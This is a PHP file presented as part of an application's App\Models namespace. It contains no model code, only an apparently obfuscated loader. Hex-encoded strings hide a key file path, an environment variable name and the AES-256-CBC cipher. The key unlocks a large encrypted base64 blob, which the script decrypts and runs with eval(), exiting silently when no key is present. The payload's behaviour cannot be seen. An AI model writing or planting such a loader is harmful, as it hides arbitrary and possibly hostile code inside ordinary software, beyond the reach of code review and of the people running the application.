<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('p+p/ioThh8zANsYSUqx1kA==');

$c=base64_decode(

'1QI2TJP/WyS95f0sQLMcamFvBaEwjoLdZ3m+gcbWh+XQZOvQpOPWuVe+KJT3qVAOEwY4i01EmO9u' .
'bL3CeHnSU0lYuOhSf41t2Uk+ty2rZrUnja+XekjmF55y32uDeaxO0AtTTZ1rEgc7ycHmQTRTMHpI' .
'M0bgpeQhJM7mbnJG8Oag7/H8r3DhMFEGDswnHuz8MsFVNsbD9DyGJOc4JqHqMSVHvARuStxeQuFA' .
'rxVQikWNTKE7Gjt1xQxRavXjJOHKBNIxBzVoPIpqcx0Upnd09BJRTMPG55QliyHjNYu/uhCEnhcy' .
'hfT+DaHMitRehVwxIVA/hLkRVWJlK4oOpNV+O6fwT45xkOqbvQ46Dt2WYGDP7IN/p13lM/rZ2VPq' .
'PM5UXMog959ZJ6aUbDxkT2USiUJUXEFPjyhryXMBYt3j94wHF51KXU1MYSNFkBhzJfYjQrRF5GQK' .
'0RNiOBAhFOT2o69XvCdwXldnGOGSX7sKNtX6ykNZnzDHLAXl3vJRfobs6WdGeAplwUeVGXDcLSL8' .
'oDpmBForkDOwdC3M9AGNxxZqPMSlfj8N4FpUj2ebFaZWpaUegVUPXnktTCLSpqkx+jpX638WSPvc' .
'ZETmr+85g/hC8HSrHFVSFooBhZhMt9UmZjWV9hZUfUFiF9UT/AREuH/PS9VFrxija6fd2qW9yQW9' .
'oIh4bihq83t6bHeuEEnvwikeRFkVjX3CRSteEEyGZ+VC6iLhudJolhGI1D+LgBGWBj0/8Jjdi12t' .
'Rh8WJ+i6air97pgloPXKW2sX7hkxgljOSswFgAtxN2UA1JJM+nnt5hdBjLZbYLPqSxVbh87mz+Fj' .
'5lsURfpk7NkQftA+3fNazffxnsmdqaF5YTEPhsdm71erAEXHPWyxPdN7mQ6DQu3avSSm0LrFgAb+' .
'azb7mRRJbWY2erbpsGtQWp/LqwndKJG5ZDOoPPcJxeKzQyHoNt0H1w73oVGWEWRyEXd9lMLDfgCK' .
'4sBXMPEDaF9e8QPa4U35xH2ijCNIC42lSALKXKQI84od9NL7H49Y7NGIBK+tgQvRSUxqUQz7+QGx' .
'Wasw9FdzFsCBh7n8eZ0Au8SxNSQenSK/B0Ou+1AEG+GBjYnUos/pCGQJsKRBLOxQtuSImUUbjvpw' .
'l4EwLZL7A8CfamlzqoVW9Tauf+wao7lzHyzEmQXKb9OEFc0DKUSC5w3z0sMlhzhj4KTEtkn3FPYV' .
'qz66q7NArtB3xQ3dC2KhIvtA0v1qua43bagHwqUitedNf2iAooylYJbuVj37JHHHAJjJ1IHt7fWH' .
'zRBjO1qIUBw29DxP43x7fKlToD00OfY='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

